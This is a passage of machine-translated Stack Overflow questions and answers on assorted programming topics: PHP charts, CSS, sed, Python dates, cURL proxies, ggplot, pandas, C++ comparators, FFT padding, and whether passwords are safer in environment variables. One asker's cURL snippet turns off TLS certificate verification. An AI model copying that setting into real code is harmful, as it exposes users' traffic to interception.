    $Emp_Id[]=$value["Emp_Id"];//single value
}

$_GET['Variance']=$Variance;
$_GET['Emp_RecFactor']=$Emp_RecFactor;

print_r($Emp_RecFactor);

$chart = new GoogleChart('lc', 500, 200);

// manually forcing the scale to [0,100]
$chart->setScale(0,100);

// add one line
$data = new GoogleChartData($Variance);
$chart->addData($data);

// customize y axis
$y_axis = new GoogleChartAxis('y');
$y_axis->setDrawTickMarks(false)->setLabels(array(-5,0,5));
$chart->addAxis($y_axis);

// customize x axis
$x_axis = new GoogleChartAxis('x');
$x_axis->setTickMarks(5);
$chart->addAxis($x_axis);

// add a shape marker with a border
$shape_marker = new GoogleChartShapeMarker(GoogleChartShapeMarker::CIRCLE);
$shape_marker->setSize(6);
$shape_marker->setBorder(2);
$shape_marker->setData($data);
$chart->addMarker($shape_marker);

// add a value marker
$value_marker = new GoogleChartTextMarker(GoogleChartTextMarker::VALUE);
$value_marker->setData($data);
$chart->addMarker($value_marker);

//~ header('Content-Type: image/png');
echo $chart->toHtml(); 
```

正如您在代码中看到的那样，我使用了`$Variance`数组传递到`$data`现在我需要再使用一个数组`$Emp_RecFactor`，并且我需要在这两个数组之间绘制一个图形......

我还想为此添加鼠标悬停功能，以便如果有人将鼠标悬停在所选点上，它应该为不同的所选点显示不同的内容 - 我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-28T11:13:34.723

要在两个数组之间绘制 Google 散点图，您必须使用如下代码

```
 var data = google.visualization.arrayToDataTable([
    ['Age', 'Array1', 'Array2'],
    [8, 12, 15],
    [4, 5.5, 0],
    [11, 0, 14],
    [4, 9, 5],
    [3, 3.5, 9],
    [6.5, 7, 13]
]); 
```

它有一个默认的工具提示，可以在悬停所选点时显示数据。我们还可以使用 html 标签自定义 Tooltip 内容。要查看此工作示例，请访问网站[jqfaq.com](http://jqfaq.com/how-to-use-two-arrays-in-google-scattered-chart-and-draw-a-graph-between-those-two-arrays/)（示例）和自定义工具提示内容，请访问网站[jqfaq.com](http://jqfaq.com/how-to-customize-tooltip-text-using-html-tags-in-google-charts/)（自定义工具提示）

# css - 带 CSS 的圆角箭头

> ID：12461441
> 
> 赞同：9
> 
> 时间：2012-09-17T14:27:48.117
> 
> 标签：css

> **可能重复：**
> [如何使用边框半径在 CSS3 中创建三角形](https://stackoverflow.com/questions/12041938/how-to-create-a-triangle-in-css3-using-border-radius)

它们可以用 CSS 制作吗？

普通箭头：

```
.some_element:after{      
  content: '';
  height: 0;
  width: 0;
  position: absolute;        
  top: 0;
  left: 0;       
  border: 100px solid transparent;
  border-top-color: #000;           
} 
```

( [http://jsfiddle.net/W3xwE/](http://jsfiddle.net/W3xwE/) )

圆角箭头（我只想要圆角的底边）：

![在此处输入图像描述](../Images/a9e801d0d95b8b00833a5d4d6a7e85e7.png)

:(

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-17T14:36:24.247

对的，这是可能的！你`rotate`这个盒子，给它 a`border-radius`并将 a`45deg` `linear-gradient`用作`background`.

[**演示**](http://dabblet.com/gist/3737782)

**HTML**：

```
<div class='arrow'></div> 
```

**CSS**：

```
.arrow {
    width: 7em;
    height: 7em;
    border-radius: 0 0 2em 0;
    margin: 5em;
    transform: rotate(45deg);
    background: linear-gradient(-45deg, black 50%, transparent 50%);

} 
```

如果你想让箭头的角度不同，那么你也`skew`可以。

考虑到[IE9 不支持 CSS 渐变](http://caniuse.com/#feat=css-gradients)这一事实（这次我不是说“或更旧”，因为您在标签中提到了 CSS3）。在这种情况下，解决方案是使用纯色背景，并以某种方式确保上部不会显示，方法是用前面的元素覆盖它，或者剪掉它（参见[Tim Medora](https://stackoverflow.com/questions/12461441/rounded-arrows-with-css/12461632#12461632)提供的答案）。

此外，此时仍然不支持无前缀语法（尽管这很快会改变 :D ），因此您需要手动添加前缀`-webkit-`、`-moz-`和`-o-`。（我没有在演示中添加它们，因为 Dabblet 使用 -prefix-free 来处理这个问题。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T14:39:11.147

这是一种通过在框内放置一个旋转的正方形来控制剪裁的方法。就个人而言，我认为@Ana 的解决方案要干净得多。

[http://jsfiddle.net/K44mE/14/](http://jsfiddle.net/K44mE/14/)

```
<div id="outer"><div id="inner">&nbsp;</div></div>

#inner{
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    -o-transform: rotate(45deg);
    -moz-transform: rotate(45deg);
    transform: rotate(45deg);
    background-color:silver;
    width:100px;
    height:100px;
    top: -70px;
    left: 20px;
    position:relative;
    -moz-border-radius: 20px;
    border-radius: 20px;
}

#outer {
    position: absolute;
    width: 140px;
    height: 70px;    
    top:10px;
    left:10px;
    overflow: hidden;    
    border: 1px solid red;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:53:51.213

**CSS**

```
 .arrow {
        width: 7em;
        height: 7em;
        border-radius: 0 0 2em 0;
        margin: -2em 2.5em;
        transform: rotate(45deg);
        background: linear-gradient(-45deg, black 50%, transparent 50%);

    } 
```

**HTML**

```
<div class='arrow'></div> 
```

# php - 在 ZF 控制器的操作中组装 URL 时出现意外值

> ID：12461444
> 
> 赞同：1
> 
> 时间：2012-09-17T14:27:57.770
> 
> 标签：php, zend-framework

我已经命名了路线`admin/login/`

```
'adminLogin' => new Zend_Controller_Router_Route(
        'admin/login/',
        array('controller' => 'index', 'action' => 'login', 'module' => 'admin')
), 
```

现在让我们看一下我调用路由器`assemble()`函数的控制器：

```
class Admin_Controller_Index extends Zend_Controller_Action
{

    public function loginAction() {

        echo Zend_Controller_Front::getInstance()->getRouter()->assemble(
            array(
                'controller' => 'index',
                'action' => 'authentificate',
                'module' => 'admin'
            )
        );
        // will output /admin/login
        //any other plays with assemble() function will always return /admin/login
        //Why???
        exit;

    }

    public function authenitifcateAction() {
        echo Zend_Controller_Front::getInstance()->getRouter()->assemble(
            array(
                'controller' => 'index',
                'action' => 'authentificate',
                'module' => 'admin'
            )
        );
        //will output /admin/index/authentificate as expected
        //any other plays with assemble() function will aslo return expected values
        exit;
    }

} 
```

因此，`assemble()`如果在具有命名路由的控制器操作中调用，将始终返回意外值。

我究竟做错了什么？

# sed - 将值打印到 sed -n

> ID：12461445
> 
> 赞同：1
> 
> 时间：2012-09-17T14:27:59.667
> 
> 标签：sed, grep

我使用 sed 从所需点获取文件的内容，但我遇到了问题。

我无法将`$variable`值打印到此 sed 命令中

```
count=$(sed -n '/$variable/,$p' file.log | grep '"KO"' -c) 
```

我尝试使用双引号并关闭单引号但不工作

`count=$(sed -n "/$variable/,$p" file.log | grep '"KO"' -c)`错误意外'，' `count=$(sed -n '/'$variable'/,$p' file.log | grep '"KO"' -c)`错误未终止的地址正则表达式

我知道 sed 研究是字母 "$variable" 但我无法传递值...

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:10:32.040

这是一个正确引用的问题。

你的第一个例子：

```
count=$(sed -n '/$variable/,$p' file.log | grep '"KO"' -c) 
```

不展开`$variable`，因为它在单引号中，第二个：

```
count=$(sed -n "/$variable/,$p" file.log | grep '"KO"' -c) 
```

*如choroba*所述，扩展`$variable`但其内容存在问题。它也有问题，它将被解释为 shell 变量。你的第三个例子：*`$p`*

 *```
count=$(sed -n '/'$variable'/,$p' file.log | grep '"KO"' -c) 
```

非常接近您的需要，但如果`$variable`包含 sed 特别对待的字符，仍然会受到影响，因此需要对这些字符进行转义，例如以下作品：

```
variable="\[17-09-12 00:01:03\]"
count=$(sed -n '/'$variable'/,$p' file.log 
```

由于括号对 shell 来说也是特殊的，你可以使用`printf` `%q`指令自动转义它们：

```
variable="[17-09-12 00:01:03]"
variable=$(printf "%q" "$variable")
count=$(sed -n '/'$variable'/,$p' file.log 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:45:02.930

`[`中具有特殊含义`sed`。我会使用比 更强大的东西`sed`，即 Perl。它可以为您转义变量：

```
perl -ne '/\Q'"$variable"'\E/ and print' 
```*

# python - 用python解析常见的日志日期字符串

> ID：12461449
> 
> 赞同：3
> 
> 时间：2012-09-17T14:28:17.220
> 
> 标签：python, parsing, datetime, python-2.6

## 问题：

我即将在 Python 2.6 中解析一个日志文件。[将通用日志](http://en.wikipedia.org/wiki/Common_Log_Format)日期字符串解析为时间对象时出现问题：

`13/Sep/2012:06:27:18 +0200`

## 我已经尝试过的

### 采用`dateutils.parser.parse`

我已经尝试过使用`dateutils.parser.parse`，但解析失败并出现以下错误：

`ValueError: unknown string format`

### 采用`time.strptime`

我尝试`time.strptime`使用格式字符串`%d/%b/%Y:%H:%M:%S %z`，但在解析时区时遇到了麻烦：

`ValueError: 'z' is a bad directive in format '%d/%b/%Y:%H:%M:%S %z'`

有谁知道，错误在哪里？或者这只是错误的方法？

## 最终解决方案

最后我决定使用`time.strptime`剥离时区信息：

```
time.strptime(datestring[:-6], '%d/%b/%Y:%H:%M:%S') 
```

不想使用的原因`dateutils`是它`dateutils`比`strptime`（实际上调用 C 函数）慢得多。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:37:34.977

这就是我所看到的：

*   `dateutil`不喜欢在日期后面加上时间
*   `%z`您的底层 C 实现不支持该指令（请参阅[此问题](https://stackoverflow.com/questions/2609259/converting-string-to-datetime-object-in-python)）

一个快速简单的解决方案（虽然，不是很优雅）：

```
>>> s = '13/Sep/2012:06:27:18 +0200'
>>> dateutil.parser.parse(s.replace(':', ' ', 1))
datetime.datetime(2012, 9, 13, 6, 27, 18, tzinfo=tzoffset(None, 7200)) 
```

提醒一下，可选的第三个参数 to`replace`是[最大替换计数](http://docs.python.org/library/stdtypes.html#str.replace)。

# php - 通过 PHP 中的代理的 cURL 发布请求

> ID：12461455
> 
> 赞同：1
> 
> 时间：2012-09-17T14:28:49.670
> 
> 标签：php, post, curl, proxy

我想用 cURL 做一个 POST 请求，但是通过一个 ip 代理服务器。代码是正确的，但是我的回复是空的。

对于 GET 请求，可以，但对于 POST 请求则不行。

我怎样才能做到这一点 ？

先感谢您

编辑：下面的代码：

```
$ret = curl_setopt($c, CURLOPT_URL, $url);
$ret = curl_setopt($c, CURLOPT_POST, 1);
$ret = curl_setopt($c, CURLOPT_POSTFIELDS, $postdata);
$ret = curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
$ret = curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
$ret = curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
if ($proxy != null) {
    $ret = curl_setopt($c, CURLOPT_HTTPPROXYTUNNEL, true);
    $ret = curl_setopt($c, CURLOPT_PROXY, $proxy);
    $ret = curl_setopt($c, CURLOPT_PROXYUSERPWD, $proxyident);
}
$ret = curl_exec($c); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:45:10.837

正如其他人所暗示的那样，您确实需要展示您的代码。从有限的信息来看，我认为您可能错过了允许 POST 的 setopt：

```
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
```

[http://php.net/manual/en/function.curl-setopt.php](http://php.net/manual/en/function.curl-setopt.php)

# asp.net-mvc-4 - 将大量数据上传到 Azure 表

> ID：12461458
> 
> 赞同：0
> 
> 时间：2012-09-17T14:29:13.667
> 
> 标签：asp.net-mvc-4, azure-table-storage, form-post

我正在尝试以 POST 形式将大量文本发送到 azure 表存储。此文本的每一行都将作为一个实体存储在表中。我现在遇到的问题是这个操作超过了时间限制。

> 操作已超过 Windows Azure 表服务操作允许的默认最长时间

所以我想知道是否可以提高这个限制，或者我应该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T01:27:36.157

我想知道您所说的“大量文本”是什么意思。重要的是您一次性向 Azure 发送了多少数据；由于您将每条线分成自己的实体，因此每个实体不可能那么大，对吗？

这里有几个想法。您是否将所有实体作为批处理操作发送？如果是这样，批次本身可能太大。例如，您可能希望一次发送更少的实体，或者将数据压缩为字节数组。或者更好的是，将数据保存为 blob，并将实体用作指向 blob 的 URI 的指针。

# r - 如何为散点图中的线条创建图例？

> ID：12461461
> 
> 赞同：-2
> 
> 时间：2012-09-17T14:29:22.013
> 
> 标签：r, ggplot2

我想为散点图添加主对角线和回归线的图例。

我现在得到的：

```
library(ggplot2)
df = data.frame(x = 1:10, y = 1:10)

p <- ggplot(df, aes(x, y)) +
geom_point(size=1.2) +
scale_x_continuous(expand=c(0,0)) +
scale_y_continuous(expand=c(0,0)) +
geom_smooth(method="lm", se=FALSE, formula=y~x, colour="blue", fill=NA, size=1.2) +
geom_abline(intercept=0, slope=1, size=1.2, colour="red") +
geom_text(aes(x=max(df[,1])/1.4, y=max(df[,2])/1.2, label=lm_eqn(df)), colour="blue",  parse=TRUE) +
# doesn't work: scale_colour_manual("Lines", labels=c("Main Diagonal", "Regression"), values=c("red", "blue")) +
labs(x="X", y="Y") 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:53:50.220

使用`show_guide=TRUE` 例如

```
 p <- ggplot(df, aes(x, y)) +
geom_point(size=1.2) +
scale_x_continuous(expand=c(0,0)) +
scale_y_continuous(expand=c(0,0)) +
geom_smooth(method="lm", se=FALSE, formula=y~x, colour="blue", fill=NA, size=1.2) +
geom_abline(aes(colour="red"),intercept=0, slope=1, size=1.2,show_guide=TRUE) +
geom_text(aes(x=max(df[,1])/1.4, y=max(df[,2])/1.2, label="lm_eqn(df)"), colour="blue",  parse=TRUE) +
# doesn't work: scale_colour_manual("Lines", labels=c("Main Diagonal", "Regression"), values=c("red", "blue")) +
labs(x="X", y="Y") + opts(legend.position = 'left') 
```

另外，您可以将有关使用的传说移动`+ opts(legend.position = 'left')`到左侧。[我建议您查看Tyler Rinker](https://stackoverflow.com/users/1000343/tyler-rinker)提供的链接以及以下内容：

[https://github.com/hadley/ggplot2/wiki/Legend-Attributes](https://github.com/hadley/ggplot2/wiki/Legend-Attributes)

也不知道什么`lm_eqn`ia 所以在我的代码中我用它包围了它，`""`所以它会像它写的那样出现..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-20T11:03:44.367

我终于可以设法为回归和位于右下角的对角线创建一个图例，这是有道理的：

```
 p <- ggplot(df, aes(x, y)) +
geom_point(size=1.2) +
scale_x_continuous(expand=c(0,0)) +
scale_y_continuous(expand=c(0,0)) +
geom_abline(aes(colour="red"),intercept=0, slope=1, size=1.2, aes(colour="1"), show_guide=TRUE) + # new code
geom_smooth(method="lm", se=FALSE, formula=y~x, fill=NA, size=1.2, aes(colour="2"), show_guide=TRUE) + # new code
scale_colour_manual("Lines", labels=c("Diagonal", "Regression"), values=c("red", "blue")) +
opts(legend.position = c(0.85, 0.15)) # relative values, must be set individually 
```

# node.js - 谷歌电子表格 - - Node.js

> ID：12461462
> 
> 赞同：1
> 
> 时间：2012-09-17T14:29:25.143
> 
> 标签：node.js, google-api, google-drive-api, google-sheets, google-signin

我正在开发一个 Node.js 应用程序，我将要求用户使用他们的 Google ID 进行身份验证

用户完成身份验证后，我的应用程序将在用户帐户中**创建一个 google 电子表格。**

1.  我应该开始研究 Google Drive API 还是应该开始研究电子表格 api？

2.  Node.js 中是否有可用的现成模块？

3.  如何使用 google 登录对用户进行身份验证？

**编辑 -**

4\. 如果我必须代表用户、服务帐户或客户 ID 创建电子表格，我应该创建哪种 API 访问？这两者有什么区别？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:42:33.133

1) 要在用户帐户中创建电子表格（或任何其他文档类型），您必须使用 Drive API

2) 没有 Node.js 模块，但 Drive SDK 文档包含所有可用于入门的方法的 JavaScript 示例

3）您必须使用 OAuth 2.0 来授权您的请求：[https ://developers.google.com/drive/about-auth](https://developers.google.com/drive/about-auth)

# android - How to draw a line between two images in android?

> ID：12461468
> 
> 赞同：0
> 
> 时间：2012-09-17T14:29:42.853
> 
> 标签：android

I need to implement a program to join an image from one column to other column. I need do the next: link: [http://imageshack.us/a/img217/6163/exampleoz.png](http://imageshack.us/a/img217/6163/exampleoz.png)

I have tried with drag and drop ([android developers drag and drop](http://developer.android.com/guide/topics/ui/drag-drop.html)) but it isn't what I need because with drag and drop you move the image from one location to another and I don't want to move anything. I want that when you press one image on the screen, without lifting the finger, and then you move your finger to other image and lift the finger, the two images are matched.

**Thank you!!!!!!!!!!!!!!!**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:57:16.683

In `onTouchEvent()` :

On `ACTION_DOWN` store first position (`event.getX()`, `event.getY()`)

On `ACTION_UP` store second position.

Draw a line between those 2 points.

# python - 如何在分层索引 DataFrame 中的单个索引上广播？

> ID：12461470
> 
> 赞同：2
> 
> 时间：2012-09-17T14:29:46.023
> 
> 标签：python, pandas

我有一个分层索引的数据框：

```
>>> import pandas as pd
>>> df = pd.DataFrame(np.arange(4),
                      index=[['John', 'John', 'Vicki', 'Vicki'], 
                             ['a','b', 'a','b']],
                      columns=['score'])

         score
John  a      0
      b      1
Vicki a      2
      b      3 
```

以及索引与上述数据框中的第一个索引级别相同的系列：

```
>>> series = pd.Series([100, 200], index=['John', 'Vicki'])

John     100
Vicki    200 
```

现在我想将数据框与系列合并，以便系列中的值沿二级索引广播。生成的数据框应如下所示：

```
 score  salary
John  a      0     100
      b      1     100
Vicki a      2     200
      b      3     200 
```

我怎样才能在熊猫中实现这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:16:28.827

这应该有效：

```
df['salary'] = series.reindex(df.index, level=0) 
```

# c# - 在 SharePoint 2010 中以编程方式修改主页的内容

> ID：12461473
> 
> 赞同：1
> 
> 时间：2012-09-17T14:30:02.727
> 
> 标签：c#, sharepoint, sharepoint-2010

首先，我对 SharePoint 还很陌生，所以如果这是一个无聊的问题或者我没有立即提供所有正确的信息，请不要开枪... :)

我在 SharePoint 中有一个带有以下 URL 的团队网站：“ [http://myServer/Opdracht_Ben/](http://myServer/Opdracht_Ben/) ”。通过转到此 URL，我被重定向到以下页面：“ [http://myServer/sites/Opdracht_Ben/SitePages/Home.aspx](http://myServer/sites/Opdracht_Ben/SitePages/Home.aspx) ”。

在 Visual Studio 中，我有一个带有功能的站点项目。当此站点功能被激活时，它应该将主页的内容更改为一些自定义的 tekst 和布局（即：HTML）。内容不包含在 Web 部件中或页面不是 WikiPage，只是页面上的文本。

我一直在查看 MSDN 以及几个技术网站和博客，但我没有找到任何可以进一步帮助我的东西。有谁知道我如何“访问”页面的内容并修改/更新它？

**PS：** 在这里，我找到了一个相关的问题（[**点击查看问题**](https://stackoverflow.com/questions/7849605/modifying-rich-content-on-home-page-programmatically)），但提供的解决方案适用于当网络是“发布网络”时，这里不是这种情况，所以这个解决方案对我没有任何帮助好的。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:51:28.957

我发现该页面毕竟是一个 WikiPage。所以我设法用以下代码更改了内容：

```
using (var site = new SPSite(ApplicationResources.Url.SiteRoot))
{
    using (var web = site.OpenWeb())
    {
        var page = web.GetFile(ApplicationResources.Url.FullDefaultPageName);
        var item = page.Item;
        item["Wiki Content"] = NewContent(title, text);
        item.Update();
    }
} 
```

也许这不是最好的方法，所以如果有人有更好更可靠的解决方案：请随时纠正我！;)

# arrays - 没有空变量值的 foreach 回显

> ID：12461474
> 
> 赞同：0
> 
> 时间：2012-09-17T14:30:05.590
> 
> 标签：arrays, variables, foreach, var

我想用来`foreach`回显所有图像路径，但是当变量为空时`$bild_5`，不应显示任何 HTML 代码。

我的代码：

```
<html>

<?php

// var
$url    = "http://www.URL/assets/";

$bild_1 = $url . "bild-1.jpg"; 
$bild_2 = $url . "bild-2.jpg"; 
$bild_3 = $url . "bild-3.jpg"; 
$bild_4 = $url . "bild-4.jpg"; 
$bild_5 = ""; 

// array
$bilder = array ("$bild_1", "$bild_2", "$bild_3", "$bild_4", "$bild_5");
?>

<ul>
    <!-- foreach / Template -->
    <?php foreach($bilder as $bild) { ?>    

        <li><img src="<?php echo $bild; ?>"</li>

    <?php } ?>
</ul>

</html> 
```

* * *

## HTML-输出

```
<html>

<ul>                
   <li><img src="http://www.URL/assets/bild-1.jpg"</li>
   <li><img src="http://www.URL/assets/bild-2.jpg"</li>
   <li><img src="http://www.URL/assets/bild-2.jpg"</li>
   <li><img src="http://www.URL/assets/bild-4.jpg"</li>
   <li><img src=""</li>    // Don´t display this HTML code; ( $bild_5 = ""; )
</ul>

</html> 
```

感谢您的
帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:32:01.037

您可以使用`continue`跳过

```
<?php foreach($bilder as $bild) { ?>   
       <?php if (empty($bild)) continue; ?> 

        <li><img src="<?php echo $bild; ?>"</li>

<?php } ?> 
```

我还建议您在混合 PHP 和 HTML 时使用控制结构的替代语法。更容易阅读

```
<?php foreach($bilder as $bild) : ?>    

        <li><img src="<?php echo $bild; ?>"</li>

<?php endforeach; ?> 
```

参考 - [http://php.net/manual/en/control-structures.alternative-syntax.php](http://php.net/manual/en/control-structures.alternative-syntax.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:33:45.207

要么继续使用；如上所述，或者只是`array_filter($bilder);`在你的 foreach 之前运行

# c++ - 使用比较函数失败，引用类型

> ID：12461476
> 
> 赞同：1
> 
> 时间：2012-09-17T14:30:09.267
> 
> 标签：c++, templates, stl

我有一个模板类，如下所示（`using namespace std`为简洁起见，假设为 a）：

```
template <typename Type, typename Compare = less<Type>>
struct weighted_base
{
    typedef typename set<pair<Type, double>, set_compare<Type, Compare>> mapped_type;
    map<Type, mapped_type, Compare> backing_map;
    ...
}; 
```

其中`set_compare`定义为：

```
template <typename Type, typename Compare>
struct set_compare
{
     bool operator()(const pair<Type, double>& a, 
                     const pair<Type, double>& b)
     {
         return Compare(a.first, b.first);
     }
}; 
```

也就是说，映射将类型的键作为`Type`值`std::set<std::pair<Type, double>>`。当我使用以下方法时，这会出现一些问题：

```
void insert(const Type& from, const Type& to, double weight)
{
    //...
    mapped_type& adj_nodes = backing_map[from];
    adj_nodes.insert(make_pair(to, weight));
} 
```

问题在于`set`，当它调用时`set_compare`，它有一个类型`const Type&`，不是`Type`。因此，假设它是`std::less`，在这种情况下，它将尝试调用`less<int>::less(const int& a, const int& b)`which 失败。

是否有某种方法可以修复它，以便两个包含都可以在这里（有效地）使用相同的比较功能？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:37:24.940

`Compare`是二元仿函数的类型，所以你可能需要

```
return Compare()(a.first, b.first); 
```

where`Compare()`是一个临时的、默认构造的 `Compare`实例。例如，如果您替换`Compare`，`std::less<int>`

```
std::cout << std::boolalpha;
std::cout << std::less<int>(5,50) << "\n"; // Error!
std::cout << std::less<int>()(5,50) << "\n"; // OK 
```

您的错误可能会给您带来许多编译器错误，其中一些可能会使您走错路。我建议先修复它，然后查看代码的行为是否符合您的预期。

# python - scipy.fftpack 中的 2D 数组的零填充如何工作？

> ID：12461479
> 
> 赞同：0
> 
> 时间：2012-09-17T14:30:14.770
> 
> 标签：python, numpy, scipy, fft

我正在尝试通过使用该`anfft` [模块](http://code.google.com/p/anfft/)来提高计算搜索图像和模板图像之间标准化互相关的函数的速度，该模块为 FFTW C 库提供 Python 绑定，并且似乎比它快 2-3 倍`scipy.fftpack`为了我的目的。

当我对模板进行 FFT 时，我需要将结果填充到与搜索图像相同的大小，以便对它们进行卷积。使用`scipy.fftpack.fftn`我只会使用`shape`参数进行填充/截断，但`anfft.fftn`更简约并且本身不进行任何零填充。

当我尝试自己进行零填充时，我得到的结果与我使用`shape`的 . 这个例子只使用了`scipy.fftpack`，但我有同样的问题`anfft`：

```
import numpy as np
from scipy.fftpack import fftn
from scipy.misc import lena

img = lena()
temp = img[240:281,240:281]

def procrustes(a,target,padval=0):

    # Forces an array to a target size by either padding it with a constant or
    # truncating it

    b = np.ones(target,a.dtype)*padval
    aind = [slice(None,None)]*a.ndim
    bind = [slice(None,None)]*a.ndim
    for dd in xrange(a.ndim):
        if a.shape[dd] > target[dd]:
            diff = (a.shape[dd]-b.shape[dd])/2.
            aind[dd] = slice(np.floor(diff),a.shape[dd]-np.ceil(diff))
        elif a.shape[dd] < target[dd]:
            diff = (b.shape[dd]-a.shape[dd])/2.
            bind[dd] = slice(np.floor(diff),b.shape[dd]-np.ceil(diff))
    b[bind] = a[aind]
    return b

# using scipy.fftpack.fftn's shape parameter
F1 = fftn(temp,shape=img.shape)

# doing my own zero-padding
temp_padded = procrustes(temp,img.shape)
F2 = fftn(temp_padded)

# these results are quite different
np.allclose(F1,F2) 
```

我怀疑我可能犯了一个非常基本的错误，因为我对离散傅里叶变换并不太熟悉。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:38:18.973

只需进行逆变换，您就会看到 scipy 的填充略有不同（仅在顶部和右侧边缘）：

```
plt.imshow(ifftn(fftn(procrustes(temp,img.shape))).real)

plt.imshow(ifftn(fftn(temp,shape=img.shape)).real) 
```

# ruby-on-rails - 将密码作为环境变量（而不是纯文本）存储在配置文件中是否安全？

> ID：12461484
> 
> 赞同：156
> 
> 时间：2012-09-17T14:30:45.360
> 
> 标签：ruby-on-rails, django, security, passwords, environment-variables

我在 Rails、django（和一点点 php）中开发了一些应用程序，我开始在其中一些应用程序中做的一件事是将数据库和其他密码存储为环境变量，而不是某些配置文件中的纯文本（或在 settings.py 中，用于 django 应用程序）。

在与我的一位合作者讨论这个问题时，他认为这是一种糟糕的做法——也许这并不像最初看起来那样完全安全。

所以，我想知道 - 这是一种安全的做法吗？将密码作为纯文本存储在这些文件中是否更安全（当然，请确保不要将这些文件留在公共存储库或任何东西中）？

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2012-09-17T16:15:53.190

如前所述，一旦您的系统受到威胁，这两种方法都不会提供任何额外的“安全”层。**我相信支持环境变量的最强有力的原因之一是版本控制**：我已经看到太多的数据库配置等意外存储在 GIT 等版本控制系统中，供其他开发人员查看（哎呀！它发生在我也是 ...）。

不将密码存储在文件中会使它们无法存储在版本控制系统中。

* * *

## 回答 #2

> 赞同：73
> 
> 时间：2012-09-17T14:56:26.817

在更理论的层面上，我倾向于以以下方式考虑安全级别（按强度增加的顺序）：

*   没有安全感。纯文本。任何知道在哪里查找的人都可以访问数据。
*   混淆的安全性。您将数据（明文）存储在某个棘手的地方，例如环境变量，或者存储在一个看起来像配置文件的文件中。攻击者最终会弄清楚发生了什么，或者偶然发现它。
*   加密提供的安全性很容易破解，（想想凯撒密码！）。
*   加密提供的安全性可以通过一些努力来破解。
*   加密提供的安全性对于破解当前硬件是不切实际的。
*   最安全的系统是任何人都无法使用的系统！:)

环境变量比明文文件*更*安全，因为它们是 volatile/disposable，不保存；即，如果您只设置了一个本地环境变量，例如“set pwd=whatever”，然后运行脚本，并在脚本结束时退出您的命令外壳程序，那么该变量将不再存在。你的案子属于前两个，我想说这是相当不安全的。如果您要这样做，我不建议在您的直接 Intranet/家庭网络之外进行部署，然后仅用于测试目的。

* * *

## 回答 #3

> 赞同：58
> 
> 时间：2012-09-17T14:42:04.413

每当您必须存储密码时，它都是不安全的。时期。没有办法安全地存储未加密的密码。现在，哪个环境变量与配置文件更“安全”可能值得商榷。恕我直言，如果您的系统受到威胁，那么它的存储位置并不重要，勤奋的黑客可以追踪它。

* * *

## 回答 #4

> 赞同：36
> 
> 时间：2015-02-04T19:41:35.997

抱歉，我没有足够的代表发表评论，但我还想补充一点，如果您不小心，您的 shell 也可能会在其命令历史记录中捕获该密码。因此，手动运行之类的东西`$ pwd=mypassword my_prog`并不像您希望的那样短暂。

* * *

## 回答 #5

> 赞同：30
> 
> 时间：2019-08-01T21:29:18.370

我认为，如果可能，您应该将凭据存储在 gitignored 文件中，而不是作为环境变量。

在 ENV（环境）变量和文件中存储凭据时要考虑的一件事是，您使用的任何库或依赖项都可以很容易地检查 ENV 变量。

这可以恶意或不恶意地完成。例如，库作者可以通过电子邮件将堆栈跟踪和 ENV 变量发送给他们自己进行调试（不是最佳实践，但可以这样做）。

如果您的凭据在文件中，那么进入它们的峰值要困难得多。

具体来说，考虑 node.js 中的 npm。让 npm 查看您的凭据（如果它们在 ENV 中）只是简单的`process.ENV`. 另一方面，如果它们在文件中，则工作量要大得多。

您的凭据文件是否受版本控制是一个单独的问题。不是版本控制您的凭据文件会将其暴露给更少的人。所有开发人员都不需要知道生产凭证。由于这符合最小特权原则，我建议 git 忽略您的凭据文件。

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2018-06-27T14:01:51.057

这取决于您的威胁模型。

您是否试图阻止您的用户在他们的文件系统中散布密码，这些密码可能会被遗忘和处理不当？如果是这样，那么是的，因为环境变量不如文件持久。

您是否正在尝试防范直接针对您的程序的恶意软件？如果是这样，那么不，因为环境变量没有文件所具有的相同级别的访问控制。

就个人而言，我认为疏忽的用户比有动机的对手更常见，所以我会采用环境变量方法。

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2020-09-30T14:26:02.720

其中，使用**环境变量**存储机密的一个问题是它们可能会被无意泄露：

*   向用户显示带有上下文（环境变量）的原始错误消息的凌乱代码
*   监控工具捕获错误和上下文并将其发送/存储以供将来调查
*   开发人员记录环境变量，将它们保存到磁盘（并可能保存到某些日志处理工具，例如`Logstash`）
*   受损的依赖项将其可以访问的所有全局变量（包括环境变量）发送给攻击者
*   设置 env 变量在 shell 历史记录中[留下痕迹](https://stackoverflow.com/a/28329996/2579733)

**存储在配置文件**中的秘密的潜在问题：

*   错误配置的文件权限允许访问随机操作系统用户
*   开发人员将配置文件添加到版本控制
    *   故意的（不知道不好）
    *   意外地。即使文件被删除（可能在 PR 审查期间），如果没有正确完成，它可能仍然存在于 Git 提交历史中。

